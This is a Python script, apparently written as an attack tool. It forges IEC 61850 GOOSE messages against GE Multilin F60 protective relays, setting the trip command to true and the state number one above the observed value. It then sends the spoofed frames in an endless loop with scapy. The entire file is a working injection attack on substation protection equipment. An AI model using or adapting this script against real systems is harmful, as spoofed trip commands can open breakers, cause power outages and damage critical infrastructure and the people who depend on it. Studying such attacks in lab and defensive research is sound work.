"""
GOOSE Trip Packet Generator for GE Multilin F60 IEDs
Author: Hermenegildo Alberto
Date: January 8, 2025
"""

from datetime import datetime
from pyasn1.codec.ber import encoder
from pyasn1.type import tag
from scapy.layers.l2 import Ether
from scapy.all import sendp
from goose.goose_pdu import IECGoosePDU, AllData, Data
from goose_.goose import GOOSE

if __name__ == '__main__':
    stNum = 86  # Run the Goose dissector to see the number of the state number and increment 1
    sqNum = 0   # Sequence number
    confRev = 1 # Add Configuration revision according with the packet structure

    try:
        while True:
            # Create GOOSE PDU
            g = IECGoosePDU().subtype(
                implicitTag=tag.Tag(
                    tag.tagClassApplication,
                    tag.tagFormatConstructed,
                    1
                )
            )
            # Configure GOOSE fields
            g.setComponentByName('gocbRef', '') # Add GOOSE Control Block reference
            g.setComponentByName('timeAllowedtoLive', 7500)
            g.setComponentByName('datSet', '') # Add Data Set reference
            g.setComponentByName('goID', '') # GOOSE ID

            # Get the current UTC time and convert it to seconds and nanoseconds
            current_time = datetime.utcnow()
            epoch = datetime(1970, 1, 1)
            total_seconds = int((current_time - epoch).total_seconds())
            current_nanoseconds = int(current_time.microsecond * 1e3)

            # Convert to 8 bytes (4 bytes for seconds and 4 bytes for nanoseconds)
            current_time_bytes = total_seconds.to_bytes(4, byteorder='big') + current_nanoseconds.to_bytes(4, byteorder='big')

            # Debug: Print the current time and its byte representation
            print(f"Current time (s): {total_seconds}, (ns): {current_nanoseconds}")
            print(f"Current time (bytes): {current_time_bytes.hex()}")

            g.setComponentByName('t', current_time_bytes)

            # Set remaining GOOSE fields
            g.setComponentByName('stNum', stNum) # State number
            g.setComponentByName('sqNum', sqNum) # Sequence number
            g.setComponentByName('simulation', False)   # Simulation flag
            g.setComponentByName('confRev', confRev) # Configuration revision
            g.setComponentByName('ndsCom', False) # NDS COM flag
            g.setComponentByName('numDatSetEntries', 2) # Number of dataset entries

            # Create and populate the dataset entries
            d = AllData().subtype(
                implicitTag=tag.Tag(
                    tag.tagClassContext,
                    tag.tagFormatConstructed,
                    11
                )
            )
            d1 = Data()
            d1.setComponentByName('boolean', True) # Trip command
            d2 = Data()
            d2.setComponentByName('bit-string', "'0000000000000'B")
            d.setComponentByPosition(0, d1)
            d.setComponentByPosition(1, d2)
            g.setComponentByName('allData', d)

            # Create the Ethernet frame with GOOSE payload, setting the appid here
            packet = Ether(src='', dst='', type=0x88B8) / \
                     GOOSE(appid=int(0x0002)) / \
                     encoder.encode(g)

            # Send the packet over the eth1 or other interface
            sendp(packet, iface='eth1', count=1, inter=4)

            # Increment the sequence number for the next message
            sqNum += 1

    except KeyboardInterrupt:
        print("Exiting...")
